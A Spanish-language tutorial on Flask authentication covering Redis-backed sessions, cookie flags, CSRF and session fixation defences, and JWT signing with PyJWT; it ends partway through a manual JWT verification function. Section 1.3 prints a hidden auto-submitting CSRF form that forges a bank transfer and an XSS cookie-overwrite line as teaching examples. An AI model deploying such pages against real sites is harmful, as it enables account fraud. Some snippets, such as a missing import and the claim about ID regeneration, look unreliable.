# Autenticación Web con Python y Flask
### Cookies con Estado · JWT Sin Estado · Seguridad y Vulnerabilidades

> **Cómo usar esta guía:** Léela de forma secuencial la primera vez. Cada rama es independiente después. Los bloques de código son ejemplos funcionales listos para experimentar. Se asume Python 3.10+ y Flask 3.x.

---

## Índice

- [Setup inicial del proyecto](#setup-inicial-del-proyecto)
- [Rama 1 — Autenticación con Estado (Cookies)](#rama-1--autenticación-con-estado-cookies)
  - [1.1 El Mecanismo de Sesión](#11-el-mecanismo-de-sesión)
  - [1.2 Banderas de Seguridad (Flags)](#12-banderas-de-seguridad-flags)
  - [1.3 Vulnerabilidades Estructurales](#13-vulnerabilidades-estructurales)
  - [1.4 Protocolo de Defensa Anti-CSRF](#14-protocolo-de-defensa-anti-csrf)
- [Rama 2 — Autenticación Sin Estado (JWT)](#rama-2--autenticación-sin-estado-jwt)
  - [2.1 Anatomía del Token](#21-anatomía-del-token)
  - [2.2 Criptografía y Firmas](#22-criptografía-y-firmas)
  - [2.3 Flujo de Transporte](#23-flujo-de-transporte)
  - [2.4 Vulnerabilidades Estructurales](#24-vulnerabilidades-estructurales)
- [Comparativa Final y Cuándo Usar Cada Uno](#comparativa-final-y-cuándo-usar-cada-uno)

---

## Setup inicial del proyecto

Antes de comenzar, esta es la estructura base y las dependencias que se usan a lo largo de esta guía:

```bash
# Crear entorno virtual
python -m venv venv
source venv/bin/activate  # Linux/macOS
# venv\Scripts\activate   # Windows

# Instalar dependencias
pip install flask \
            flask-session \
            redis \
            pyjwt \
            bcrypt \
            flask-wtf \       # Para tokens CSRF en formularios
            python-dotenv     # Para variables de entorno
```

```
mi_proyecto/
├── app.py
├── config.py
├── .env                  ← Nunca subir a git
├── requirements.txt
└── templates/
    └── transfer.html
```

```python
# .env
SECRET_KEY=una-clave-muy-larga-y-aleatoria-de-al-menos-32-chars
JWT_SECRET=otra-clave-diferente-para-jwt-igual-de-larga
REDIS_URL=redis://localhost:6379
DATABASE_URL=postgresql://user:pass@localhost/mydb
```

```python
# config.py
import os
from dotenv import load_dotenv

load_dotenv()

class Config:
    SECRET_KEY = os.environ["SECRET_KEY"]          # Obligatorio — lanza error si no existe
    JWT_SECRET = os.environ["JWT_SECRET"]
    REDIS_URL   = os.getenv("REDIS_URL", "redis://localhost:6379")
    SESSION_TYPE = "redis"                          # O "filesystem" para desarrollo
    SESSION_COOKIE_HTTPONLY  = True
    SESSION_COOKIE_SECURE    = os.getenv("ENV") == "production"
    SESSION_COOKIE_SAMESITE  = "Strict"
    PERMANENT_SESSION_LIFETIME = 3600              # 1 hora en segundos
```

---

# Rama 1 — Autenticación con Estado (Cookies)

> **Concepto central:** El servidor *recuerda* quién eres. El cliente solo guarda un identificador (la cookie); el estado real vive en el servidor.

---

## 1.1 El Mecanismo de Sesión

### ¿Qué problema resuelve?

HTTP es un protocolo **sin memoria**. Cada request es independiente. Sin sesiones, tendrías que enviar usuario y contraseña en cada petición — un desastre de seguridad.

Las sesiones resuelven esto con un "apretón de manos" inicial que genera un identificador temporal.

### Flujo completo paso a paso

```
┌─────────────────────────────────────────────────────────────────┐
│                    FLUJO DE SESIÓN COMPLETO                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CLIENTE                              SERVIDOR (Flask)          │
│                                                                 │
│  1. POST /login                                                 │
│     { user: "ana", pass: "..." }  ──►  Verifica credenciales   │
│                                        Crea sesión en Redis     │
│                                        session_id = "abc123"    │
│                                                                 │
│  2.                               ◄──  HTTP 200 OK              │
│     Guarda cookie automáticamente      Set-Cookie: session=...  │
│     (el navegador lo hace solo)                                 │
│                                                                 │
│  3. GET /dashboard                                              │
│     Cookie: session=abc123        ──►  Busca "abc123" en Redis  │
│                                        Encuentra → usuario=ana  │
│                                        Responde con datos       │
│                                                                 │
│  4.                               ◄──  HTTP 200 + datos de Ana  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### La cabecera `Set-Cookie`

El servidor la envía en la **respuesta HTTP**. El navegador la guarda y la reenvía automáticamente en cada request al mismo dominio.

```http
HTTP/1.1 200 OK
Set-Cookie: session=abc123xyz; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
Content-Type: application/json
```

Desglose de cada parte:

| Parte | Valor | Descripción |
|-------|-------|-------------|
| `session` | `abc123xyz` | Nombre y valor de la cookie |
| `Path=/` | `/` | Enviar en todas las rutas del dominio |
| `HttpOnly` | *(flag)* | Sin acceso desde JavaScript |
| `Secure` | *(flag)* | Solo enviar por HTTPS |
| `SameSite=Strict` | `Strict` | No enviar en requests cross-site |
| `Max-Age=3600` | `3600` | Expira en 1 hora (segundos) |

### Flask y la sesión: cómo funciona internamente

Flask tiene **dos modos** de sesión que debes conocer:

```
┌─────────────────────────────────────────────────────────────────────┐
│  MODO 1: Sesión firmada en cookie (Flask por defecto)               │
│                                                                     │
│  Todo el contenido de session{} viaja en la cookie, firmado con     │
│  SECRET_KEY. No hay servidor de estado.                             │
│                                                                     │
│  ✅ Sin dependencias externas (cero config)                         │
│  ❌ El contenido es visible (Base64 decodificable), solo firmado     │
│  ❌ No se puede invalidar sin cambiar SECRET_KEY (sin logout real)   │
│  ✅ Ideal para: prototipos y apps pequeñas                           │
└─────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────┐
│  MODO 2: Flask-Session (sesión en servidor)                         │
│                                                                     │
│  Solo un ID aleatorio viaja en la cookie. El contenido real vive    │
│  en Redis, filesystem, MongoDB, etc.                                │
│                                                                     │
│  ✅ Logout real (borrar sesión del store)                            │
│  ✅ El cliente no ve los datos de sesión                             │
│  ✅ Escala con múltiples workers/procesos                            │
│  ✅ Ideal para: producción                                           │
└─────────────────────────────────────────────────────────────────────┘
```

### Implementación completa con Flask-Session + Redis

```python
# app.py
from flask import Flask, request, jsonify, session
from flask_session import Session
import redis
import bcrypt
import os
from config import Config

app = Flask(__name__)
app.config.from_object(Config)

# Conectar Redis y configurar Flask-Session
redis_client = redis.from_url(app.config["REDIS_URL"])
app.config["SESSION_REDIS"] = redis_client
Session(app)  # Reemplaza la sesión por defecto de Flask


# ── Simulación de base de datos ──────────────────────────────────────
USERS_DB = {
    "ana": {
        "id": 42,
        "username": "ana",
        "role": "admin",
        # bcrypt hash de "password123"
        "password_hash": bcrypt.hashpw(b"password123", bcrypt.gensalt())
    }
}


# ── Middleware: decorador de autenticación ────────────────────────────
from functools import wraps

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if "user_id" not in session:
            return jsonify({"error": "No autenticado"}), 401
        return f(*args, **kwargs)
    return decorated


# ── Rutas ─────────────────────────────────────────────────────────────
@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    username = data.get("username", "")
    password = data.get("password", "").encode("utf-8")

    user = USERS_DB.get(username)

    # Verificar existencia y contraseña
    if not user or not bcrypt.checkpw(password, user["password_hash"]):
        return jsonify({"error": "Credenciales inválidas"}), 401

    # ⚠️ IMPORTANTE: limpiar la sesión y regenerar el ID
    # Esto previene Session Fixation (ver sección 1.3)
    session.clear()

    # Guardar solo lo necesario en la sesión
    session["user_id"]  = user["id"]
    session["username"] = user["username"]
    session["role"]     = user["role"]
    session.permanent   = True   # Respeta PERMANENT_SESSION_LIFETIME

    return jsonify({"message": "Login exitoso", "username": user["username"]})


@app.route("/logout", methods=["POST"])
@login_required
def logout():
    session.clear()   # Elimina la sesión del store de Redis
    return jsonify({"message": "Sesión cerrada"})


@app.route("/dashboard")
@login_required
def dashboard():
    return jsonify({
        "user_id":  session["user_id"],
        "username": session["username"],
        "role":     session["role"],
    })


@app.route("/admin")
@login_required
def admin_panel():
    if session.get("role") != "admin":
        return jsonify({"error": "Acceso denegado"}), 403
    return jsonify({"message": "Panel de administración"})


if __name__ == "__main__":
    app.run(debug=True)
```

### Almacenamiento del lado del servidor

El ID que viaja en la cookie es solo una **clave**. El valor real vive en Redis:

```
┌──────────────────────────────────────────────────────────────────┐
│               SESSION STORE en Redis                             │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  "session:abc123xyz"  →  {                                       │
│                            "user_id": 42,                        │
│                            "username": "ana",                    │
│                            "role": "admin",                      │
│                            "_permanent": true                    │
│                          }  [TTL: 3600s]                         │
│                                                                  │
│  "session:def456uvw"  →  { "user_id": 7, ... }  [TTL: 1800s]   │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

**Opciones de SESSION_TYPE en Flask-Session:**

```python
# Redis (recomendado para producción)
app.config["SESSION_TYPE"] = "redis"
app.config["SESSION_REDIS"] = redis.from_url("redis://localhost:6379")

# Filesystem (desarrollo, sin dependencias externas)
app.config["SESSION_TYPE"] = "filesystem"
app.config["SESSION_FILE_DIR"] = "/tmp/flask_sessions"

# MongoDB
app.config["SESSION_TYPE"] = "mongodb"
app.config["SESSION_MONGODB"] = pymongo.MongoClient()

# SQLAlchemy (si ya usas una DB SQL)
app.config["SESSION_TYPE"] = "sqlalchemy"
app.config["SESSION_SQLALCHEMY"] = db  # instancia de SQLAlchemy
```

---

## 1.2 Banderas de Seguridad (Flags)

Las flags son **modificadores** de la cookie que le dicen al navegador cómo comportarse. Son la primera línea de defensa.

### `HttpOnly`

**¿Qué hace?** Impide que JavaScript pueda leer o modificar la cookie.

```javascript
// SIN HttpOnly — JavaScript puede robar la cookie:
document.cookie  // → "session=abc123xyz; user_pref=dark"

// CON HttpOnly — JavaScript no puede acceder:
document.cookie  // → "" (la cookie HttpOnly no aparece nunca)
```

**En Flask:**

```python
# config.py — afecta a la cookie de sesión
SESSION_COOKIE_HTTPONLY = True   # ← Siempre True para cookies de sesión

# Para cookies manuales también puedes especificarlo:
response = make_response(jsonify({"ok": True}))
response.set_cookie(
    "mi_cookie",
    value="valor",
    httponly=True,    # ← aquí
    secure=True,
    samesite="Strict"
)
```

**Lo que NO protege:** No evita que la cookie se envíe en requests HTTP normales. Para eso existe `SameSite`.

### `Secure`

**¿Qué hace?** El navegador solo envía la cookie si la conexión es **HTTPS**.

```
Sin Secure:
  GET /dashboard via HTTP   → Cookie: session=abc123  (se envía — peligroso en WiFi pública)
  GET /dashboard via HTTPS  → Cookie: session=abc123  (se envía)

Con Secure:
  GET /dashboard via HTTP   → (sin cookie — bloqueada por el navegador)
  GET /dashboard via HTTPS  → Cookie: session=abc123  (se envía)
```

**En Flask:**

```python
# config.py
SESSION_COOKIE_SECURE = os.getenv("FLASK_ENV") == "production"

# Alternativa más explícita:
SESSION_COOKIE_SECURE = not app.debug
```

> En desarrollo local con HTTP, puedes dejarlo en `False`. En producción, **siempre `True`**.

### `SameSite`

Controla cuándo se envía la cookie en requests que provienen de **otro dominio**.

```
┌───────────────┬─────────────────────────────────────────────────────────┐
│ Strict        │ La cookie NUNCA se envía en requests cross-site.        │
│               │ Ni al hacer clic en un enlace desde otro sitio.         │
│               │ Máxima protección. Puede afectar UX en algunos casos.   │
├───────────────┼─────────────────────────────────────────────────────────┤
│ Lax           │ No se envía en POST cross-site, pero SÍ en GET de       │
│               │ navegación (links normales). Balance seguridad/UX.      │
│               │ Default moderno en Chrome.                              │
├───────────────┼─────────────────────────────────────────────────────────┤
│ None          │ Se envía siempre. Requiere Secure obligatoriamente.     │
│               │ Necesario para casos cross-domain (OAuth, iframes).     │
└───────────────┴─────────────────────────────────────────────────────────┘
```

**En Flask:**

```python
# config.py
SESSION_COOKIE_SAMESITE = "Strict"    # Recomendado para la mayoría de apps
# SESSION_COOKIE_SAMESITE = "Lax"     # Si necesitas links externos que funcionen
# SESSION_COOKIE_SAMESITE = "None"    # Solo para OAuth / iframes cross-domain
```

**Ejemplo visual del efecto:**

```
Usuario está en: evil-site.com
Hace clic en enlace malicioso hacia: bank.com/transfer?to=atacante&amount=1000

  SameSite=Strict  → bank.com NO recibe la cookie   ✅ Seguro
  SameSite=Lax     → bank.com recibe cookie en GET  ⚠️  Depende del caso
  SameSite=None    → bank.com recibe cookie siempre ❌ Vulnerable a CSRF
```

### Configuración consolidada recomendada

```python
# config.py — configuración segura completa para producción
class ProductionConfig:
    SECRET_KEY = os.environ["SECRET_KEY"]

    # Sesión
    SESSION_TYPE                = "redis"
    SESSION_COOKIE_NAME         = "sid"            # Nombre genérico (no revela el framework)
    SESSION_COOKIE_HTTPONLY     = True
    SESSION_COOKIE_SECURE       = True
    SESSION_COOKIE_SAMESITE     = "Strict"
    SESSION_COOKIE_PATH         = "/"
    PERMANENT_SESSION_LIFETIME  = 3600             # 1 hora

    # También aplica a cookies manuales con make_response
    # (estas son para el objeto `app.config` general de Flask)
    WTF_CSRF_TIME_LIMIT         = 3600


class DevelopmentConfig:
    SECRET_KEY                  = "dev-key-not-for-production"
    SESSION_TYPE                = "filesystem"
    SESSION_COOKIE_HTTPONLY     = True
    SESSION_COOKIE_SECURE       = False            # HTTP en local
    SESSION_COOKIE_SAMESITE     = "Lax"
    PERMANENT_SESSION_LIFETIME  = 86400            # 24h en dev para comodidad
```

---

## 1.3 Vulnerabilidades Estructurales

### CSRF — Cross-Site Request Forgery

**Concepto:** El atacante *engaña al navegador de la víctima* para que haga un request al servidor legítimo. El navegador envía las cookies automáticamente, así que el servidor no distingue si la acción fue iniciada por el usuario real o por el sitio malicioso.

#### Mecánica exacta del ataque

```
Prerequisito: La víctima está logueada en bank.com (tiene cookie de sesión activa)

PASO 1: El atacante crea una página maliciosa
─────────────────────────────────────────────
<!-- En evil.com/steal.html -->
<html>
  <body onload="document.getElementById('f').submit()">
    <form id="f"
          action="https://bank.com/transfer"
          method="POST"
          style="display:none">
      <input name="amount"     value="5000">
      <input name="to_account" value="atacante-cuenta-123">
    </form>
  </body>
</html>

PASO 2: El atacante engaña a la víctima para visitar evil.com
─────────────────────────────────────────────────────────────
  (phishing, link en foro, imagen en email, etc.)

PASO 3: El navegador de la víctima envía automáticamente:
─────────────────────────────────────────────────────────
  POST https://bank.com/transfer
  Cookie: sid=abc123xyz  ← El navegador adjunta la cookie legítima sin que el usuario lo sepa
  Content-Type: application/x-www-form-urlencoded

  amount=5000&to_account=atacante-cuenta-123

PASO 4: Flask recibe la cookie válida
──────────────────────────────────────
  session["user_id"] existe → usuario autenticado
  Ejecuta la transferencia  ← ¡Sin que la víctima lo sepa!
```

**¿Por qué funciona?** El servidor solo valida la cookie, y el navegador la envía automáticamente a ciegas.

**¿Qué NO puede hacer el atacante con CSRF?**
- Leer las respuestas del servidor (Same-Origin Policy lo bloquea)
- Ver datos del usuario
- Solo puede *ejecutar acciones en su nombre*

### Session Fixation

**Concepto:** El atacante *fija* un ID de sesión conocido por él antes de que la víctima se autentique. Cuando la víctima hace login, el servidor autentica esa sesión — y el atacante ya tenía el ID.

#### Mecánica exacta del ataque

```
PASO 1: El atacante obtiene un session ID válido pero no autenticado
────────────────────────────────────────────────────────────────────
  GET https://bank.com/
  ← Set-Cookie: sid=ATACANTE_CONOCE_ESTE_ID

  Flask genera una sesión vacía para cualquier visitante.
  El atacante anota: "ATACANTE_CONOCE_ESTE_ID"

PASO 2: El atacante hace que la víctima use ese session ID
──────────────────────────────────────────────────────────
  Método A: Link con session ID en la URL (si el servidor acepta params)
    https://bank.com/login?session_id=ATACANTE_CONOCE_ESTE_ID

  Método B: XSS para sobrescribir la cookie
    document.cookie = "sid=ATACANTE_CONOCE_ESTE_ID; path=/"

PASO 3: La víctima hace login con ese session ID fijado
─────────────────────────────────────────────────────────
  Si Flask NO regenera el ID al autenticar:
  La sesión "ATACANTE_CONOCE_ESTE_ID" queda autenticada como la víctima

PASO 4: El atacante usa el ID que ya conocía
──────────────────────────────────────────────
  GET /dashboard  Cookie: sid=ATACANTE_CONOCE_ESTE_ID
  → Flask encuentra la sesión → responde con datos de la víctima ✅ Atacante ganó
```

**La defensa es llamar a `session.clear()` justo antes de escribir los datos de login:**

```python
# ❌ VULNERABLE — El session ID no cambia al autenticar
@app.route("/login", methods=["POST"])
def login_inseguro():
    user = autenticar(request.json)
    session["user_id"] = user["id"]   # El ID de sesión sigue siendo el prefijado
    return jsonify({"ok": True})


# ✅ SEGURO — session.clear() descarta el ID anterior y genera uno nuevo
@app.route("/login", methods=["POST"])
def login_seguro():
    user = autenticar(request.json)
    session.clear()                   # ← Genera nuevo session ID
    session["user_id"] = user["id"]
    session["role"]    = user["role"]
    return jsonify({"ok": True})
```

> **Nota sobre Flask:** `session.clear()` en Flask-Session (modo servidor) elimina los datos del store antiguo y crea una nueva entrada con un ID diferente. En la sesión por defecto de Flask (firmada en cookie), simplemente limpia el diccionario. Ambos invalidan la sesión previa.

---

## 1.4 Protocolo de Defensa Anti-CSRF

La defensa contra CSRF se basa en **añadir algo que el atacante no puede conocer ni replicar** al request legítimo.

### El patrón Synchronizer Token

```
┌──────────────────────────────────────────────────────────────────────┐
│                    FLUJO CON TOKEN ANTI-CSRF                         │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. GET /transfer  (el usuario pide el formulario)                   │
│     ──────────────────────────────────────────────────────────────►  │
│                                                                      │
│  2. Flask genera un token secreto y lo guarda en la sesión:          │
│     csrf_token = secrets.token_hex(32)                               │
│     session["csrf_token"] = csrf_token                               │
│                                                                      │
│  3. Flask renderiza el HTML con el token embebido:                   │
│     ◄────────────────────────────────────────────────────────────── │
│     <form method="POST" action="/transfer">                          │
│       <input type="hidden" name="csrf_token" value="a3f8c2...">     │
│       <input name="amount">                                          │
│       <button>Transferir</button>                                    │
│     </form>                                                          │
│                                                                      │
│  4. POST /transfer (el usuario envía el formulario)                  │
│     Cookie: sid=abc123           ← Enviada automáticamente           │
│     Body: amount=100&csrf_token=a3f8c2...  ← Incluida por el form   │
│     ──────────────────────────────────────────────────────────────►  │
│                                                                      │
│  5. Flask valida:                                                     │
│     session["csrf_token"] == request.form["csrf_token"]  ?           │
│     ✅ Coincide → procesar transferencia                              │
│     ❌ No coincide → 403 Forbidden                                   │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

**¿Por qué el atacante no puede replicarlo?** El token está en el HTML del formulario (que el atacante no puede leer por Same-Origin Policy) y en la sesión del servidor.

### Implementación con Flask-WTF (recomendada para formularios)

Flask-WTF integra protección CSRF automática para todos los formularios:

```python
# app.py
from flask import Flask, render_template, request, jsonify
from flask_wtf import FlaskForm
from flask_wtf.csrf import CSRFProtect, CSRFError
from wtforms import DecimalField, StringField
from wtforms.validators import DataRequired, Length
import os

app = Flask(__name__)
app.config["SECRET_KEY"] = os.environ["SECRET_KEY"]
app.config["WTF_CSRF_TIME_LIMIT"] = 3600   # Token CSRF válido por 1 hora

csrf = CSRFProtect(app)   # ← Protege TODOS los formularios POST automáticamente


# ── Formulario con validación ──────────────────────────────────────
class TransferForm(FlaskForm):
    amount     = DecimalField("Monto", validators=[DataRequired()])
    to_account = StringField("Cuenta destino", validators=[DataRequired(), Length(min=10, max=20)])


# ── Ruta GET — mostrar formulario con token embebido ──────────────
@app.route("/transfer", methods=["GET"])
def transfer_form():
    form = TransferForm()
    # form.hidden_tag() genera: <input type="hidden" name="csrf_token" value="...">
    return render_template("transfer.html", form=form)


# ── Ruta POST — Flask-WTF valida el token automáticamente ─────────
@app.route("/transfer", methods=["POST"])
def transfer():
    form = TransferForm()

    if not form.validate_on_submit():
        # validate_on_submit() incluye la validación CSRF
        return jsonify({"errors": form.errors}), 400

    # Si llegamos aquí, el token CSRF fue válido
    amount     = form.amount.data
    to_account = form.to_account.data
    # ... procesar transferencia ...
    return jsonify({"message": f"Transferidos {amount} a {to_account}"})


# ── Manejo de errores CSRF ─────────────────────────────────────────
@app.errorhandler(CSRFError)
def handle_csrf_error(e):
    return jsonify({"error": "Token CSRF inválido o expirado", "reason": e.description}), 403
```

```html
<!-- templates/transfer.html -->
<!DOCTYPE html>
<html>
<head><title>Transferencia</title></head>
<body>
  <h1>Transferir fondos</h1>
  <form method="POST" action="/transfer">
    {{ form.hidden_tag() }}  <!-- ← Genera el campo oculto con el token CSRF -->

    <label>Monto:</label>
    {{ form.amount() }}

    <label>Cuenta destino:</label>
    {{ form.to_account() }}

    <button type="submit">Transferir</button>
  </form>
</body>
</html>
```

### Implementación manual para APIs (sin Flask-WTF)

Para APIs JSON donde no hay formularios HTML:

```python
# csrf_utils.py
import secrets
import hmac
from flask import session, request, abort


def generate_csrf_token() -> str:
    """Genera y almacena un token CSRF en la sesión."""
    if "csrf_token" not in session:
        session["csrf_token"] = secrets.token_hex(32)
    return session["csrf_token"]


def validate_csrf_token() -> bool:
    """
    Compara el token de la sesión con el del header o body.
    Usa hmac.compare_digest para evitar timing attacks.
    """
    session_token = session.get("csrf_token")
    if not session_token:
        return False

    # Buscar el token en header primero, luego en body JSON
    request_token = (
        request.headers.get("X-CSRF-Token")
        or (request.get_json(silent=True) or {}).get("csrf_token")
        or request.form.get("csrf_token")
    )

    if not request_token:
        return False

    return hmac.compare_digest(session_token, request_token)


def csrf_protect(f):
    """Decorador que valida el token CSRF en métodos mutantes."""
    @wraps(f)
    def decorated(*args, **kwargs):
        if request.method in ("POST", "PUT", "DELETE", "PATCH"):
            if not validate_csrf_token():
                abort(403, description="Token CSRF inválido")
        return f(*args, **kwargs)
    return decorated
```

```python
# app.py — uso del decorador manual
from csrf_utils import generate_csrf_token, csrf_protect

@app.route("/api/csrf-token", methods=["GET"])
@login_required
def get_csrf_token():
    """Endpoint para que el cliente SPA obtenga su token."""
    return jsonify({"csrf_token": generate_csrf_token()})


@app.route("/api/transfer", methods=["POST"])
@login_required
@csrf_protect
def api_transfer():
    data = request.get_json()
    # Si llegamos aquí, el token CSRF fue válido
    return jsonify({"message": "Transferencia procesada"})
```

```javascript
// Cliente (JavaScript de tu SPA)
async function getAndStoreToken() {
    const res = await fetch("/api/csrf-token", { credentials: "include" });
    const { csrf_token } = await res.json();
    return csrf_token;
}

async function transfer(amount, toAccount) {
    const token = await getAndStoreToken();

    return fetch("/api/transfer", {
        method: "POST",
        credentials: "include",
        headers: {
            "Content-Type": "application/json",
            "X-CSRF-Token": token           // ← Header personalizado
        },
        body: JSON.stringify({ amount, to_account: toAccount })
    });
}
```

### Desactivar CSRF para endpoints específicos (ej: webhooks)

```python
from flask_wtf.csrf import CSRFProtect, exempt

csrf = CSRFProtect(app)

# Opción 1: decorador por ruta
@app.route("/webhook/stripe", methods=["POST"])
@csrf.exempt
def stripe_webhook():
    # Stripe envía requests sin token CSRF — usar su propia firma
    payload   = request.get_data()
    sig_header = request.headers.get("Stripe-Signature")
    # verificar_firma_stripe(payload, sig_header)
    return jsonify({"received": True})

# Opción 2: blueprint completo
from flask import Blueprint
api_bp = Blueprint("api", __name__, url_prefix="/api/v1")
csrf.exempt(api_bp)   # Exime todo el blueprint (proteger con JWT en su lugar)
```

### Comparativa de métodos Anti-CSRF

| Método | Tipo de App | Complejidad | Protección |
|--------|------------|-------------|------------|
| Flask-WTF automático | SSR con formularios | Muy baja | Alta |
| Token en header `X-CSRF-Token` | SPA/API JSON | Media | Alta |
| `SameSite=Strict` solo | Cualquiera | Muy baja | Media* |
| Double Submit Cookie | SPA sin estado de servidor | Media | Media-Alta |

*`SameSite=Strict` es una capa de defensa valiosa, pero no suficiente sola (navegadores viejos, subdominios, casos edge).

---

# Rama 2 — Autenticación Sin Estado (JWT)

> **Concepto central:** El servidor *no recuerda* nada. El cliente guarda toda la información de autenticación en un token firmado criptográficamente. El servidor solo verifica la firma.

---

## 2.1 Anatomía del Token

Un JWT (JSON Web Token) es una cadena de texto con tres partes separadas por puntos:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.
eyJ1c2VySWQiOjQyLCJ1c2VybmFtZSI6ImFuYSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMCwiZXhwIjoxNzAwMDAzNjAwfQ
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Puedes decodificar cada parte manualmente en Python:

```python
import base64
import json

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQyfQ.XYZ"
header_b64, payload_b64, signature_b64 = token.split(".")

# Base64URL necesita padding para decodificar
def decode_b64(s: str) -> dict:
    padding = "=" * (4 - len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(s + padding))

print(decode_b64(header_b64))   # {'alg': 'HS256', 'typ': 'JWT'}
print(decode_b64(payload_b64))  # {'userId': 42, 'username': 'ana', ...}
# La signature NO es JSON, es bytes crudos — no se decodifica así
```

Estructura completa:

```
┌─────────────────────────────────────────────────────────────────────┐
│  PARTE 1: HEADER                                                    │
│  {                                                                  │
│    "alg": "HS256",    ← Algoritmo de firma                         │
│    "typ": "JWT"       ← Tipo de token                              │
│  }                                                                  │
├─────────────────────────────────────────────────────────────────────┤
│  PARTE 2: PAYLOAD (los datos reales — visible, no cifrado)          │
│  {                                                                  │
│    "user_id":  42,              ← Claim personalizado               │
│    "username": "ana",           ← Claim personalizado               │
│    "role":     "admin",         ← Claim personalizado               │
│    "iat": 1700000000,           ← issued at (cuándo se creó)       │
│    "exp": 1700003600,           ← expiration (cuándo expira)       │
│    "iss": "mi-app.com"          ← issuer (quién lo emitió)         │
│  }                                                                  │
├─────────────────────────────────────────────────────────────────────┤
│  PARTE 3: SIGNATURE                                                 │
│  HMAC-SHA256(                                                       │
│    base64url(header) + "." + base64url(payload),                   │
│    SECRET_KEY                                                       │
│  )                                                                  │
│  → La ÚNICA parte que el cliente NO puede generar ni falsificar    │
└─────────────────────────────────────────────────────────────────────┘
```

> ⚠️ **Confusión muy común:** El payload de un JWT **no está cifrado**. Solo está codificado en Base64. Cualquiera puede leerlo. **Nunca pongas datos sensibles** (contraseñas, datos bancarios, info privada) en el payload.

### Claims estándar del payload (RFC 7519)

```python
import time

payload = {
    # Claims registrados — nombres reservados y cortos
    "iss": "https://mi-app.com",         # issuer: quién emitió el token
    "sub": "42",                          # subject: identificador del usuario
    "aud": "https://api.mi-app.com",     # audience: a quién va dirigido
    "exp": int(time.time()) + 3600,      # expiration: timestamp Unix (obligatorio)
    "nbf": int(time.time()),             # not before: válido desde...
    "iat": int(time.time()),             # issued at: cuándo se creó
    "jti": "uuid-unico-por-token",       # JWT ID: para blacklisting

    # Claims privados — los tuyos (nombres que no colisionen con los de arriba)
    "user_id":     42,
    "role":        "admin",
    "permissions": ["read:users", "write:posts"],
}
```

---

## 2.2 Criptografía y Firmas

### HS256: HMAC con SHA-256

La firma se construye así:

```
SIGNATURE = HMAC-SHA256(
  mensaje: base64url(HEADER) + "." + base64url(PAYLOAD),
  clave:   SECRET_KEY
)
```

Visualmente:

```
  eyJhbGci...  +  "."  +  eyJ1c2Vy...
  (Header B64)              (Payload B64)
         │                      │
         └──────────┬───────────┘
                    │
                    ▼
        "eyJhbGci....eyJ1c2Vy..."  (concatenación)
                    │
                    │  + SECRET_KEY
                    │
                    ▼
               HMAC-SHA256()
                    │
                    ▼
            SflKxwRJSMeKKF2...
             (Signature en Base64URL)
```

**¿Qué garantiza la firma?**

1. **Integridad:** Si alguien modifica el payload (ej: `"role": "user"` → `"role": "admin"`), la firma ya no coincide. El servidor rechaza el token.
2. **Autenticidad:** Solo quien conoce `SECRET_KEY` puede generar firmas válidas.

**¿Qué NO garantiza?**
- **Confidencialidad:** El payload es público (solo Base64)
- **Revocación:** No hay forma nativa de invalidar un token antes de que expire

### Implementación con PyJWT

```python
# jwt_utils.py
import jwt
import uuid
import time
import os
from typing import Optional

SECRET  = os.environ["JWT_SECRET"]
ALGORITHM = "HS256"


def create_access_token(user_id: int, username: str, role: str) -> str:
    """Crea un access token con vida corta (15 minutos)."""
    now = int(time.time())
    payload = {
        "user_id":  user_id,
        "username": username,
        "role":     role,
        "iat": now,
        "exp": now + 900,           # 15 minutos
        "iss": "mi-app.com",
        "jti": str(uuid.uuid4()),   # ID único para posible blacklisting
    }
    return jwt.encode(payload, SECRET, algorithm=ALGORITHM)


def create_refresh_token(user_id: int) -> str:
    """Crea un refresh token con vida larga (7 días)."""
    now = int(time.time())
    payload = {
        "user_id": user_id,
        "type":    "refresh",       # Distinguirlo del access token
        "iat": now,
        "exp": now + 604800,        # 7 días
        "jti": str(uuid.uuid4()),
    }
    return jwt.encode(payload, SECRET, algorithm=ALGORITHM)


def verify_token(token: str) -> Optional[dict]:
    """
    Verifica y decodifica un token. Retorna el payload o None si es inválido.
    """
    try:
        payload = jwt.decode(
            token,
            SECRET,
            algorithms=[ALGORITHM],     # ⚠️ Lista EXPLÍCITA — nunca omitir
            options={
                "verify_exp": True,     # Verificar expiración (default True)
                "verify_iss": True,     # Verificar issuer
            },
            issuer="mi-app.com"
        )
        return payload

    except jwt.ExpiredSignatureError:
        return None   # Token expirado (manejar con código específico si necesitas)
    except jwt.InvalidTokenError:
        return None   # Token malformado, firma inválida, etc.
```

> ⚠️ **Vulnerabilidad histórica crítica:** Siempre especifica `algorithms=["HS256"]` de forma explícita. Versiones antiguas de librerías JWT aceptaban `"alg": "none"` en el header, permitiendo tokens sin firma. La lista explícita lo previene completamente.

### Verificación paso a paso (internamente)

```python
# Cómo PyJWT verifica internamente — útil para entender el proceso
import hmac
import hashlib
import base64
import json

def verify_jwt_manual(token: str, secret: str) -> bool:
    parts = token.split(".")
    if len(parts) != 3:
        return False

    header_b64, payload_b64, sig_b64 = parts

    # 1. Recalcular la firma
    message = f"{header_b64}.{payload_b64}".encode("utf-8")
    expected_sig = hmac.new(secret.encode(), message, hashlib.sha256).digest()
    expected_sig_b64 = base64.urlsafe_b64encode(expected_sig).rstrip(b"=").decode()

    # 2. Comparar (timing-safe para evitar timing attacks)
    if not hmac.compare_digest(sig_b64, expected_sig_b64):
        return False

    # 3. Verificar expiración
    padding = "=" * (4 - len(payload_b64) % 4)
    payload = json.loads(base64.urlsafe_b64decode(payload_b64 + padding))

